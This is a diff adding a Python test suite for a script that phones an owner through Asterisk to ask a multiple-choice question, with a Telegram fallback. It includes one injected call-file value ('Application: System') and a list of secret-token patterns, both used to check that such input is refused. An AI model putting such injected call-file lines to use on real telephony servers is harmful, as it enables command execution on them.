@@ -1,0 +1,2692 @@
+import importlib.util
+import io
+import json
+import os
+import socket
+import tempfile
+import threading
+import unittest
+import unittest.mock
+import wave
+from datetime import datetime
+from pathlib import Path
+
+SCRIPT = Path(__file__).resolve().parent.parent / ".claude/skills/ceo-call/scripts/ceo_call.py"
+spec = importlib.util.spec_from_file_location("ceo_call", SCRIPT)
+ceo = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(ceo)
+ceo.DEFAULT_CONFIG["state_file"] = None  # tests must never touch the real throttle file
+ceo.DEFAULT_CONFIG["lock_file"] = None  # nor the real run lock
+
+
+def fake_synth(host, port, text):
+    return (22050, 2, 1, b"\x10\x00" * 2205)  # 0.1 s of a constant tone
+
+
+class FakeClock:
+    """Time only moves when the code sleeps, so the polling loop runs for real and instantly."""
+
+    def __init__(self):
+        self.now = 0.0
+
+    def __call__(self):
+        return self.now
+
+    def sleep(self, seconds):
+        self.now += seconds
+
+
+class FakeAsterisk:
+    """Simulates the call folder. Each script entry says what one originated call leaves behind:
+    a plain string is the result written at once ("unanswered" and "hangup" are special), a dict
+    maps a read count (reads of the call folder after the call started) to the markers that appear."""
+
+    def __init__(self, script):
+        self.files = {}
+        self.script = list(script)
+        self.dirs = set()
+        self.originated = 0
+        self.swept = 0
+        self.registered = True
+        self.in_call = False
+        self.timeline = {}
+        self.reads = 0
+
+    def sweep_stale(self):
+        self.swept += 1
+
+    def endpoint_available(self, endpoint):
+        value = self.registered
+        return value() if callable(value) else value
+
+    def endpoint_in_call(self, endpoint):
+        return self.in_call
+
+    def make_dir(self, path):
+        self.dirs.add(path)
+
+    def write_file(self, path, data):
+        self.files[path] = data
+
+    def read_file(self, path):
+        self.reads += 1
+        base = next(iter(self.dirs)) if self.dirs else ""
+        for when in [w for w in self.timeline if w <= self.reads]:
+            for name, value in self.timeline.pop(when).items():
+                self.files[base + "/" + name] = value
+        value = self.files.get(path)
+        return value.decode() if isinstance(value, bytes) else value
+
+    def remove(self, *paths, strict=False):
+        for path in paths:
+            for key in [k for k in self.files if k == path or k.startswith(path + "/")]:
+                del self.files[key]
+            self.dirs.discard(path)
+
+    def originate(self, name, call_file, before_commit=None):
+        if before_commit is not None:
+            before_commit()
+        self.originated += 1
+        base = next(iter(self.dirs))
+        outcome = self.script.pop(0)
+        self.reads = 0
+        if isinstance(outcome, dict):
+            self.timeline = dict(outcome)
+            return
+        if outcome == "unanswered":
+            return
+        self.files[base + "/answered"] = "1"
+        if outcome != "hangup":
+            self.files[base + "/result"] = outcome
+        self.files[base + "/done"] = "1"
+
+
+def run_ask(script, request=None, env=None, notifier=None, config=None, clock_time=(12, 0)):
+    cfg = dict(ceo.DEFAULT_CONFIG, retry_delay_s=0, poll_interval_s=2, ring_timeout_s=30, call_timeout_s=300, attempts=3)
+    cfg.update(config or {})
+    clock = FakeClock()
+    asterisk = FakeAsterisk(script)
+    sent = []
+
+    def default_notifier(token, chat, text, silent=False):
+        sent.append((token, chat, text, silent))
+        return True
+
+    request = request or {"question": "Ship it?", "options": ["Yes", "No", "Later"]}
+    result = ceo.ask(
+        request, cfg, env if env is not None else {}, asterisk,
+        synth=fake_synth, notifier=notifier or default_notifier,
+        sleep=clock.sleep, clock=clock,
+        now=lambda: datetime(2026, 1, 1, *clock_time),
+    )
+    run_ask.clock = clock
+    return result, asterisk, sent
+
+
+class QuietCheckFailureTests(unittest.TestCase):
+    def test_a_failing_quiet_hours_check_gives_the_throttle_slot_back(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        clock = FakeClock()
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), lock_file=None, min_gap_s=120, max_per_hour=6,
+                   quiet_start="22:00", quiet_end="08:00")
+
+        def broken_now():
+            raise ValueError("clock failure")
+
+        with self.assertRaises(ValueError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, cfg, {}, FakeAsterisk(["1"]), synth=fake_synth,
+                    sleep=clock.sleep, clock=clock, now=broken_now)
+        # the failed run must not leave its slot behind: an immediate second ask is not 'too soon'
+        ceo.check_throttle(cfg, wall=lambda: ceo.time.time())
+
+
+class SweepFailureTests(unittest.TestCase):
+    def test_a_hung_sweep_does_not_stop_the_ask(self):
+        class HungSweep(FakeAsterisk):
+            def sweep_stale(self):
+                raise ceo.DockerTimeout("cannot run docker (timed out)")
+
+        clock = FakeClock()
+        asterisk = HungSweep(["3"])
+        cfg = dict(ceo.DEFAULT_CONFIG, retry_delay_s=0, poll_interval_s=2, ring_timeout_s=30, call_timeout_s=300,
+                   attempts=1, state_file=None, lock_file=None)
+        result = ceo.ask({"question": "Ship it?", "options": ["Yes", "No", "Later"]}, cfg, {}, asterisk,
+                         synth=fake_synth, notifier=lambda *a, **k: True, sleep=clock.sleep, clock=clock,
+                         now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual(asterisk.originated, 1)
+        self.assertNotEqual(result.get("status"), "error")
+
+
+class ValidateRequestTests(unittest.TestCase):
+    def test_a_lone_surrogate_is_refused_before_any_call(self):
+        for request in ({"question": "q\ud83d", "options": ["a", "b"]}, {"question": "q", "options": ["a\ud83d", "b"]}):
+            with self.subTest(request=request):
+                with self.assertRaises(ceo.CallError):
+                    ceo.validate_request(request)
+
+    def test_text_that_looks_like_a_secret_is_refused(self):
+        secrets = ("ghp_" + "a" * 30, "sk-" + "b" * 30, "123456789:" + "C" * 35, "AKIA" + "D" * 16,
+                   "-----BEGIN RSA PRIVATE KEY-----")
+        for secret in secrets:
+            for request in ({"question": "Use %s?" % secret, "options": ["a", "b"]},
+                            {"question": "q", "options": ["a", "key %s" % secret]}):
+                with self.subTest(secret=secret[:8], where=list(request)[0]):
+                    with self.assertRaises(ceo.CallError):
+                        ceo.validate_request(request)
+
+    def test_ordinary_text_with_numbers_and_ids_is_accepted(self):
+        ceo.validate_request({"question": "Merge PR 14 at 10:30 (commit 46fca42)?", "options": ["Yes", "No"]})
+
+    def test_text_that_is_only_punctuation_is_refused(self):
+        for request in ({"question": "q", "options": ["?", "Sí"]}, {"question": "...", "options": ["a", "b"]}):
+            with self.subTest(request=request):
+                with self.assertRaises(ceo.CallError):
+                    ceo.validate_request(request)
+
+    def test_accepts_a_normal_request(self):
+        clean = ceo.validate_request({"question": " Ship? ", "options": ["a", " b "]})
+        self.assertEqual(clean, {"question": "Ship?", "options": ["a", "b"]})
+
+    def test_rejects_bad_requests(self):
+        bad = [
+            None, [], {}, {"question": "", "options": ["a", "b"]},
+            {"question": "q", "options": ["only one"]},
+            {"question": "q", "options": [str(i) for i in range(9)]},
+            {"question": "q", "options": ["a", ""]},
+            {"question": "q", "options": ["a", 3]},
+            {"question": "x" * 801, "options": ["a", "b"]},
+            {"question": "q", "options": ["a", "b" * 201]},
+            {"question": "q\x00", "options": ["a", "b"]},
+            {"question": "q", "options": ["a", "b\nc"]},
+        ]
+        for request in bad:
+            with self.subTest(request=request):
+                with self.assertRaises(ceo.CallError):
+                    ceo.validate_request(request)
+
+
+    def test_the_largest_allowed_request_fits_the_audio_cap_and_a_longer_one_is_refused(self):
+        # The first prompt reads the intro, question, options and instruction in one audio file.
+        # 22.05 kHz mono 16-bit is Piper's usual output; its audio must stay under MAX_PCM_BYTES.
+        bytes_per_second, chars_per_second = 22050 * 2, 10  # a deliberately slow reading speed
+        self.assertLessEqual(ceo.MAX_SPOKEN_CHARS / chars_per_second * bytes_per_second, ceo.MAX_PCM_BYTES)
+        options = ["o" * 150] * 8
+        too_long = {"question": "q" * 800, "options": options}
+        with self.assertRaises(ceo.CallError) as caught:
+            ceo.validate_request(too_long)
+        self.assertIn("too long to read aloud", str(caught.exception))
+        fits = {"question": "q" * 300, "options": ["o" * 100] * 8}
+        self.assertEqual(len(ceo.validate_request(fits)["options"]), 8)
+        spoken = ceo.build_prompts(fits["question"], fits["options"])["prompt"]
+        self.assertLessEqual(len(spoken), ceo.MAX_SPOKEN_CHARS)
+
+    def test_the_spoken_limit_is_checked_on_the_text_that_is_really_read(self):
+        # A request just under the limit on raw text but over it once the phrases are added.
+        question = "q" * 700
+        options = ["o" * 80] * 8
+        total_raw = len(question) + sum(len(o) for o in options)
+        self.assertLess(total_raw, ceo.MAX_SPOKEN_CHARS)
+        self.assertGreater(len(ceo.build_prompts(question, options)["prompt"]), ceo.MAX_SPOKEN_CHARS)
+        with self.assertRaises(ceo.CallError):
+            ceo.validate_request({"question": question, "options": options})
+
+
+class PromptTests(unittest.TestCase):
+    def test_each_option_has_a_readback_prompt_naming_it(self):
+        prompts = ceo.build_prompts("Ship it?", ["Yes", "No"])
+        self.assertTrue(prompts["prompt"].startswith("Hola, soy Claudio."))
+        self.assertIn("Opción 1: Yes", prompts["prompt"])
+        self.assertIn("Opción 2: No", prompts["prompt"])
+        self.assertIn("opción 2: No", prompts["confirm_2"])
+        self.assertIn("confirm_1", prompts)
+        self.assertNotIn("confirm_3", prompts)
+        self.assertIn("thanks", prompts)
+        self.assertIn("giveup", prompts)
+
+
+class AudioTests(unittest.TestCase):
+    def test_wav_is_mono_8k_because_asterisk_opens_no_other_wav_rate(self):
+        wav = ceo.to_wav(22050, 2, 1, b"\x10\x00" * 22050)  # one second
+        with wave.open(io.BytesIO(wav)) as handle:
+            self.assertEqual((handle.getnchannels(), handle.getsampwidth(), handle.getframerate()), (1, 2, 8000))
+            self.assertAlmostEqual(handle.getnframes(), 8000 + 2000, delta=5)  # 1 s + 0.25 s silence
+
+    def test_downsampling_keeps_a_steady_level_and_averages_out_fast_noise(self):
+        import array
+        steady = ceo.resample(array.array("h", [1000] * 2205), 22050, 8000)
+        self.assertTrue(all(v == 1000 for v in steady))
+        noisy = ceo.resample(array.array("h", [3000, -3000] * 2205), 22050, 8000)
+        self.assertLess(max(abs(v) for v in noisy), 1500)
+
+    def test_stereo_is_mixed_down_to_mono(self):
+        left, right = (100).to_bytes(2, "little", signed=True), (300).to_bytes(2, "little", signed=True)
+        wav = ceo.to_wav(16000, 2, 2, (left + right) * 1600)
+        with wave.open(io.BytesIO(wav)) as handle:
+            self.assertEqual(handle.getnchannels(), 1)
+            self.assertAlmostEqual(handle.getnframes(), 800 + 2000, delta=5)
+            first = int.from_bytes(handle.readframes(1), "little", signed=True)
+        self.assertEqual(first, 200)
+
+    def test_rejects_non_16_bit_audio(self):
+        with self.assertRaises(ceo.CallError):
+            ceo.to_wav(22050, 1, 1, b"\x00" * 100)
+
+
+class WyomingServer:
+    def __init__(self, events):
+        self.events = events
+        self.listener = socket.socket()
+        self.listener.bind(("127.0.0.1", 0))
+        self.listener.listen(1)
+        self.port = self.listener.getsockname()[1]
+        self.received = None
+        threading.Thread(target=self.serve, daemon=True).start()
+
+    def serve(self):
+        conn, _ = self.listener.accept()
+        handle = conn.makefile("rwb")
+        self.received = json.loads(handle.readline())
+        for header, payload in self.events:
+            header = dict(header)
+            if payload:
+                header["payload_length"] = len(payload)
+            handle.write((json.dumps(header) + "\n").encode() + payload)
+            handle.flush()
+        threading.Event().wait(0.5)  # the real server keeps the connection open after audio-stop
+        conn.close()
+        self.listener.close()
+
+
+class SynthesizeTests(unittest.TestCase):
+    def test_reads_audio_until_audio_stop(self):
+        server = WyomingServer([
+            ({"type": "audio-start", "data": {"rate": 22050, "width": 2, "channels": 1}}, b""),
+            ({"type": "audio-chunk", "data": {"rate": 22050, "width": 2, "channels": 1}}, b"\x01\x00\x02\x00"),
+            ({"type": "audio-chunk", "data": {"rate": 22050, "width": 2, "channels": 1}}, b"\x03\x00"),
+            ({"type": "audio-stop"}, b""),
+        ])
+        rate, width, channels, pcm = ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
+        self.assertEqual((rate, width, channels), (22050, 2, 1))
+        self.assertEqual(pcm, b"\x01\x00\x02\x00\x03\x00")
+        self.assertEqual(server.received["data"]["text"], "hola")
+
+    def test_error_event_and_early_close_fail_cleanly(self):
+        server = WyomingServer([({"type": "error", "data": {"text": "boom"}}, b"")])
+        with self.assertRaises(ceo.CallError):
+            ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
+        server = WyomingServer([({"type": "audio-start", "data": {"rate": 1, "width": 2, "channels": 1}}, b"")])
+        with self.assertRaises(ceo.CallError):
+            ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
+
+    def test_a_slowly_trickled_payload_cannot_outlast_the_overall_deadline(self):
+        import time as _t
+        listener = socket.socket()
+        listener.bind(("127.0.0.1", 0))
+        listener.listen(1)
+
+        def serve():
+            conn, _ = listener.accept()
+            conn.makefile("rwb").readline()
+            try:
+                conn.sendall(b'{"type": "audio-start", "data": {"rate": 22050, "width": 2, "channels": 1}}\n')
+                conn.sendall(b'{"type": "audio-chunk", "payload_length": 1000}\n')
+                for _ in range(40):
+                    conn.sendall(b"x")
+                    _t.sleep(0.3)
+            except OSError:
+                pass
+            conn.close()
+
+        threading.Thread(target=serve, daemon=True).start()
+        started = _t.monotonic()
+        with self.assertRaises(ceo.CallError):
+            ceo.synthesize("127.0.0.1", listener.getsockname()[1], "hola", timeout=1)
+        self.assertLess(_t.monotonic() - started, 4)
+        listener.close()
+
+    def test_a_header_line_without_a_newline_is_capped(self):
+        listener = socket.socket()
+        listener.bind(("127.0.0.1", 0))
+        listener.listen(1)
+
+        def serve():
+            conn, _ = listener.accept()
+            conn.makefile("rwb").readline()
+            try:
+                conn.sendall(b"x" * (ceo.MAX_HEADER_BYTES + 100))
+                threading.Event().wait(1)
+            except OSError:
+                pass
+            conn.close()
+
+        threading.Thread(target=serve, daemon=True).start()
+        with self.assertRaises(ceo.CallError):
+            ceo.synthesize("127.0.0.1", listener.getsockname()[1], "hola", timeout=5)
+        listener.close()
+
+    def test_malformed_messages_fail_cleanly_instead_of_raising(self):
+        bad_starts = [
+            {"type": "audio-start", "data": {"rate": None, "width": 2, "channels": 1}},
+            {"type": "audio-start", "data": [1, 2]},
+            {"type": "audio-start", "data": "text"},
+            {"type": "audio-start", "data": {"rate": [1], "width": 2, "channels": 1}},
+        ]
+        for header in bad_starts:
+            with self.subTest(header=header):
+                server = WyomingServer([(header, b""), ({"type": "audio-stop"}, b"")])
+                with self.assertRaises(ceo.CallError):
+                    ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
+
+    def test_a_zero_rate_or_negative_length_fails_cleanly(self):
+        for header in (
+            {"type": "audio-start", "data": {"rate": 0, "width": 2, "channels": 1}},
+            {"type": "audio-start", "data": {"rate": 22050, "width": 0, "channels": 1}},
+            {"type": "audio-start", "data": {"rate": 22050, "width": 2, "channels": 0}},
+            {"type": "audio-start", "data": {"rate": -5, "width": 2, "channels": 1}},
+        ):
+            with self.subTest(header=header):
+                server = WyomingServer([(header, b""), ({"type": "audio-chunk", "data": {}}, b"\x01\x00"), ({"type": "audio-stop"}, b"")])
+                with self.assertRaises(ceo.CallError):
+                    ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
+        server = WyomingServer([({"type": "audio-chunk", "data": {}, "payload_length": -1}, b"")])
+        with self.assertRaises(ceo.CallError):
+            ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
+
+    def test_a_truncated_message_is_an_error_not_silent_short_audio(self):
+        server = WyomingServer([({"type": "audio-start", "data": {"rate": 22050, "width": 2, "channels": 1}}, b""),
+                                ({"type": "audio-chunk", "data": {}, "payload_length": 10}, b"\x01\x00")])
+        with self.assertRaises(ceo.CallError):
+            ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
+
+    def test_an_absurd_sample_rate_or_channel_count_is_refused(self):
+        for data in ({"rate": 1, "width": 2, "channels": 1}, {"rate": 10**9, "width": 2, "channels": 1},
+                     {"rate": 22050, "width": 2, "channels": 64}):
+            with self.subTest(data=data):
+                server = WyomingServer([({"type": "audio-start", "data": data}, b""), ({"type": "audio-chunk", "data": {}}, b"\x01\x00"),
+                                        ({"type": "audio-stop"}, b"")])
+                with self.assertRaises(ceo.CallError):
+                    ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
+
+    def test_a_memory_error_while_converting_is_a_clean_error(self):
+        import unittest.mock as mock
+        with mock.patch.object(ceo, "resample", side_effect=MemoryError):
+            with self.assertRaises(ceo.CallError):
+                ceo.to_wav(22050, 2, 1, b"\x01\x00" * 100)
+
+    def test_deeply_nested_json_from_the_speech_server_is_a_clean_error(self):
+        listener = socket.socket()
+        listener.bind(("127.0.0.1", 0))
+        listener.listen(1)
+
+        def serve():
+            conn, _ = listener.accept()
+            conn.makefile("rwb").readline()
+            try:
+                conn.sendall(b"[" * 30000 + b"\n")
+                threading.Event().wait(0.5)
+            except OSError:
+                pass
+            conn.close()
+
+        threading.Thread(target=serve, daemon=True).start()
+        with self.assertRaises(ceo.CallError):
+            ceo.synthesize("127.0.0.1", listener.getsockname()[1], "hola", timeout=5)
+        listener.close()
+
+    def test_the_conversion_has_its_own_time_budget(self):
+        import array as _array
+        ticks = iter(range(0, 10**6, 100))  # every look at the clock is 100 s later
+        samples = _array.array("h", [1] * 200000)
+        with self.assertRaises(ceo.CallError) as caught:
+            ceo.resample(samples, 22050, 8000, clock=lambda: next(ticks), budget_s=60)
+        self.assertIn("too long", str(caught.exception))
+        # and a normal conversion within budget still works
+        out = ceo.resample(_array.array("h", [1] * 2000), 22050, 8000)
+        self.assertGreater(len(out), 0)
+
+    def test_resample_rejects_a_zero_source_rate(self):
+        with self.assertRaises(ceo.CallError):
+            ceo.resample([1, 2, 3], 0, 8000)
+
+    def test_unreachable_server_fails_cleanly(self):
+        with self.assertRaises(ceo.CallError):
+            ceo.synthesize("127.0.0.1", 1, "hola", timeout=1)
+
+
+class CallFileTests(unittest.TestCase):
+    def test_call_file_carries_only_ids_and_counts(self):
+        text = ceo.build_call_file("PJSIP/phone", "ab" * 8, 3, 30)
+        self.assertIn("Channel: PJSIP/phone", text)
+        self.assertIn("Setvar: CEO_ID=" + "ab" * 8, text)
+        self.assertIn("Setvar: CEO_OPTIONS=3", text)
+        self.assertIn("MaxRetries: 0", text)
+
+    def test_rejects_injection_in_parameters(self):
+        for endpoint, call_id in [("PJSIP/phone\nApplication: System", "ab" * 8), ("PJSIP/phone", "ab\nx"), ("SIP/x", "ab" * 8)]:
+            with self.subTest(endpoint=endpoint, call_id=call_id):
+                with self.assertRaises(ceo.CallError):
+                    ceo.build_call_file(endpoint, call_id, 2, 30)
+
+
+class ConfigTests(unittest.TestCase):
+    def write(self, content):
+        handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
+        handle.write(content)
+        handle.close()
+        self.addCleanup(os.unlink, handle.name)
+        return handle.name
+
+    def test_defaults_without_a_file(self):
+        self.assertEqual(ceo.load_config(None)["endpoint"], "PJSIP/phone")
+
+    def test_call_windows_that_could_overlap_a_live_call_are_refused(self):
+        for content in ['{"ring_timeout_s": 0}', '{"ring_timeout_s": 4}', '{"call_timeout_s": 30}', '{"piper_host": 5}', '{"env_file": ""}']:
+            with self.subTest(content=content):
+                with self.assertRaises(ceo.CallError):
+                    ceo.load_config(self.write(content))
+
+    def test_empty_quiet_hours_are_refused_instead_of_silently_switching_them_off(self):
+        for content in ['{"quiet_start": "", "quiet_end": ""}', '{"quiet_start": "22:00", "quiet_end": ""}', '{"quiet_start": "22:00"}',
+                        '{"quiet_start": "22:00", "quiet_end": "22:00"}']:
+            with self.subTest(content=content):
+                with self.assertRaises(ceo.CallError):
+                    ceo.load_config(self.write(content))
+
+    def test_a_gap_longer_than_the_throttle_memory_is_refused(self):
+        self.assertEqual(ceo.load_config(self.write('{"min_gap_s": 86400}'))["min_gap_s"], 86400)
+        with self.assertRaises(ceo.CallError):
+            ceo.load_config(self.write('{"min_gap_s": 86401}'))
+
+    def test_rejects_unknown_keys_and_bad_values(self):
+        for content in ['{"nope": 1}', '{"endpoint": "SIP/x"}', '{"attempts": 0}', '{"attempts": "3"}', '{"container": "a b"}', "[]", "not json"]:
+            with self.subTest(content=content):
+                with self.assertRaises(ceo.CallError):
+                    ceo.load_config(self.write(content))
+
+
+class EnvFileTests(unittest.TestCase):
+    def make(self, mode):
+        handle = tempfile.NamedTemporaryFile("w", delete=False)
+        handle.write("# comment\nCEO_TELEGRAM_TOKEN=abc\nCEO_TELEGRAM_CHAT_ID='42'\n")
+        handle.close()
+        os.chmod(handle.name, mode)
+        self.addCleanup(os.unlink, handle.name)
+        return handle.name
+
+    def test_private_file_is_read(self):
+        self.assertEqual(ceo.load_env_file(self.make(0o600)), {"CEO_TELEGRAM_TOKEN": "abc", "CEO_TELEGRAM_CHAT_ID": "42"})
+
+    def test_shell_style_export_lines_are_understood(self):
+        handle = tempfile.NamedTemporaryFile("w", delete=False)
+        handle.write("export CEO_TELEGRAM_TOKEN=abc\nexport   CEO_TELEGRAM_CHAT_ID=\"42\"\n")
+        handle.close()
+        os.chmod(handle.name, 0o600)
+        self.addCleanup(os.unlink, handle.name)
+        self.assertEqual(ceo.load_env_file(handle.name), {"CEO_TELEGRAM_TOKEN": "abc", "CEO_TELEGRAM_CHAT_ID": "42"})
+
+    def test_group_or_world_readable_file_is_refused(self):
+        for mode in (0o640, 0o644, 0o604):
+            with self.subTest(mode=oct(mode)):
+                with self.assertRaises(ceo.CallError):
+                    ceo.load_env_file(self.make(mode))
+
+    def test_unreadable_env_path_is_a_clean_error(self):
+        folder = tempfile.mkdtemp()
+        os.chmod(folder, 0o700)
+        self.addCleanup(os.rmdir, folder)
+        with self.assertRaises(ceo.CallError):
+            ceo.load_env_file(folder)
+
+    def test_missing_file_means_nothing_configured(self):
+        self.assertEqual(ceo.load_env_file("/nonexistent/ceo-env"), {})
+
+    def test_a_missing_env_file_the_owner_named_is_warned_about_but_not_fatal(self):
+        import contextlib
+        err = io.StringIO()
+        with contextlib.redirect_stderr(err):
+            env = ceo.load_env(dict(ceo.DEFAULT_CONFIG, env_file="/nonexistent/ceo-env"))
+        self.assertEqual(env, {})
+        self.assertIn("WARNING: env_file /nonexistent/ceo-env does not exist", err.getvalue())
+
+    def test_the_default_env_file_missing_is_not_warned_about(self):
+        import contextlib
+        err = io.StringIO()
+        with tempfile.TemporaryDirectory() as home:
+            with unittest.mock.patch.dict(os.environ, {"HOME": home}), contextlib.redirect_stderr(err):
+                self.assertEqual(ceo.load_env(dict(ceo.DEFAULT_CONFIG)), {})
+        self.assertEqual(err.getvalue(), "")
+
+    def test_a_present_env_file_is_not_warned_about(self):
+        import contextlib
+        err = io.StringIO()
+        with contextlib.redirect_stderr(err):
+            env = ceo.load_env(dict(ceo.DEFAULT_CONFIG, env_file=self.make(0o600)))
+        self.assertEqual(env["CEO_TELEGRAM_TOKEN"], "abc")
+        self.assertEqual(err.getvalue(), "")
+
+
+class TelegramTests(unittest.TestCase):
+    def test_posts_to_the_bot_api_and_reports_success(self):
+        seen = {}
+
+        class Response(io.BytesIO):
+            def __enter__(self):
+                return self
+
+            def __exit__(self, *a):
+                return False
+
+        def opener(request, timeout):
+            seen["url"], seen["body"] = request.full_url, request.data.decode()
+            return Response(b'{"ok": true}')
+
+        self.assertTrue(ceo.send_telegram("TOKEN", "42", "hello world", opener=opener))
+        self.assertEqual(seen["url"], "https://api.telegram.org/botTOKEN/sendMessage")
+        self.assertIn("chat_id=42", seen["body"])
+        self.assertIn("hello+world", seen["body"])
+
+    def test_any_failure_returns_false_without_raising(self):
+        def opener(request, timeout):
+            raise OSError("https://api.telegram.org/botTOKEN/sendMessage failed")
+
+        self.assertFalse(ceo.send_telegram("TOKEN", "42", "x", opener=opener))
+
+
+class AskFlowTests(unittest.TestCase):
+    def test_confirmed_choice_is_returned_with_its_option_text(self):
+        result, asterisk, sent = run_ask(["2"])
+        self.assertEqual(result["status"], "decided")
+        self.assertEqual((result["choice"], result["option"], result["attempt"]), (2, "No", 1))
+        self.assertIs(result["notified"], False)
+        self.assertEqual(sent, [])
+
+    def test_everything_is_removed_after_the_call_and_old_folders_are_swept_first(self):
+        result, asterisk, _ = run_ask(["1"])
+        self.assertEqual(asterisk.files, {})
+        self.assertEqual(asterisk.dirs, set())
+        self.assertEqual(asterisk.swept, 1)
+
+    def test_prompts_exist_while_the_call_runs(self):
+        seen = []
+        original = FakeAsterisk.originate
+
+        def spy(self, name, call_file, before_commit=None):
+            seen.extend(sorted(k.rsplit("/", 1)[1] for k in self.files))
+            original(self, name, call_file, before_commit)
+
+        FakeAsterisk.originate = spy
+        try:
+            run_ask(["1"])
+        finally:
+            FakeAsterisk.originate = original
+        self.assertEqual(seen, ["confirm_1.wav", "confirm_2.wav", "confirm_3.wav", "giveup.wav", "prompt.wav", "thanks.wav"])
+
+    def test_a_confirmation_that_lands_just_after_the_deadline_is_not_lost(self):
+        # The call is live (answered) when call_timeout_s expires; the owner confirms during the grace wait.
+        result, asterisk, _ = run_ask([{1: {"answered": "1"}, 100: {"result": "2", "done": "1"}}], config={"call_timeout_s": 60, "attempts": 1})
+        self.assertEqual((result["status"], result["choice"]), ("decided", 2))
+        self.assertEqual(asterisk.originated, 1)
+
+    def test_a_call_still_live_long_after_the_deadline_is_a_timeout_not_a_redial_during_the_call(self):
+        result, asterisk, _ = run_ask([{1: {"answered": "1"}, 100000: {"done": "1"}}] * 3, config={"call_timeout_s": 60, "attempts": 1})
+        self.assertEqual(result["status"], "timeout")
+
+    def test_an_infrastructure_error_after_the_start_still_messages_the_owner_then_raises(self):
+        class Flaky(FakeAsterisk):
+            def originate(self, name, call_file, before_commit=None):
+                raise ceo.CallError("cannot run docker")
+
+        sent = []
+        with self.assertRaises(ceo.CallError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                    Flaky([]), synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append(text) or True,
+                    sleep=FakeClock().sleep, clock=FakeClock(), now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual(len(sent), 1)
+        self.assertIn("Decisión pendiente", sent[0])
+
+    def test_a_result_file_that_is_still_being_written_is_not_an_error(self):
+        # Asterisk's FILE() truncates before it writes: a poll can see an empty result.
+        result, _, _ = run_ask([{1: {"answered": "1"}, 3: {"result": ""}, 6: {"result": "2", "done": "1"}}], config={"attempts": 1})
+        self.assertEqual((result["status"], result["choice"]), ("decided", 2))
+
+    def test_a_burst_of_asks_is_capped_per_hour(self):
+        import time as _t
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        now = _t.time()
+        state.write_text("".join("%d\n" % (now - 600 - 60 * i) for i in range(6)))
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        with self.assertRaises(ceo.CallError) as caught:
+            run_ask(["1"], config={"state_file": str(state), "min_gap_s": 120, "max_per_hour": 6})
+        self.assertIn("too many", str(caught.exception))
+        result, _, _ = run_ask(["1"], config={"state_file": str(state), "min_gap_s": 120, "max_per_hour": 7})
+        self.assertEqual(result["status"], "decided")
+
+    def test_a_call_still_live_after_the_grace_is_not_followed_by_a_second_call(self):
+        result, asterisk, _ = run_ask([{1: {"answered": "1"}}, "1", "1"], config={"call_timeout_s": 60})
+        self.assertEqual(result["status"], "timeout")
+        self.assertEqual(asterisk.originated, 1)
+
+    def test_quiet_hours_are_checked_again_after_the_heads_up_wait(self):
+        times = iter([(22, 59), (23, 1), (23, 1)])
+        reads = iter([False, False, True])
+        asterisk = FakeAsterisk(["1"])
+        asterisk.registered = lambda: next(reads, True)
+        cfg = dict(ceo.DEFAULT_CONFIG, retry_delay_s=0, poll_interval_s=2, ring_timeout_s=30, call_timeout_s=300,
+                   attempts=1, quiet_start="23:00", quiet_end="08:00", heads_up_s=90)
+        clock = FakeClock()
+        result = ceo.ask({"question": "q", "options": ["a", "b"]}, cfg, {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                         asterisk, synth=fake_synth, notifier=lambda *a, **k: True, sleep=clock.sleep, clock=clock,
+                         now=lambda: datetime(2026, 1, 1, *next(times)))
+        self.assertEqual(result["status"], "deferred")
+        self.assertEqual(asterisk.originated, 0)
+
+    def test_the_message_for_an_unregistered_phone_does_not_claim_it_rang(self):
+        text = ceo.notification_text("q", ["a", "b"], "phone_not_registered")
+        self.assertNotIn("No contestaste", text)
+        self.assertIn("teléfono", text)
+
+    def test_parallel_asks_cannot_slip_past_the_throttle(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=120, max_per_hour=6)
+        results = []
+        barrier = threading.Barrier(8)
+
+        def attempt():
+            barrier.wait()
+            try:
+                ceo.check_throttle(cfg, wall=lambda: 1000.0)
+                results.append("ok")
+            except ceo.CallError:
+                results.append("refused")
+
+        threads = [threading.Thread(target=attempt) for _ in range(8)]
+        [t.start() for t in threads]
+        [t.join() for t in threads]
+        self.assertEqual(results.count("ok"), 1)
+
+    def test_an_ask_that_never_placed_a_call_does_not_count_against_the_throttle(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        cfg = {"state_file": str(state), "min_gap_s": 120, "max_per_hour": 6}
+
+        def failing_synth(host, port, text):
+            raise ceo.CallError("cannot get speech from the speech server")
+
+        asterisk = FakeAsterisk([])
+        with self.assertRaises(ceo.CallError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, **cfg), {}, asterisk, synth=failing_synth,
+                    sleep=FakeClock().sleep, clock=FakeClock(), now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual(state.read_text().strip(), "")
+        result, _, _ = run_ask(["1"], config=cfg)  # the next real ask is not blocked
